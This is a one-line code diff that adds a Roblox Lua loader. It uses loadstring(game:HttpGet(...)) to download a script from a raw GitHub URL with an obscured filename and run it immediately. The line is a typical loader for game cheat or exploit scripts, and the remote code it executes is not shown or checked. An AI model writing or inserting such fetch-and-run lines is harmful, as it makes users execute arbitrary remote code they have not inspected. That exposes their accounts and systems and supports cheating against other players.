@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VIPFirstTime/UploadFile/main/SummonBlock_guzfyzdiDTiCyiCgicgi%3D%3D.lua"))()
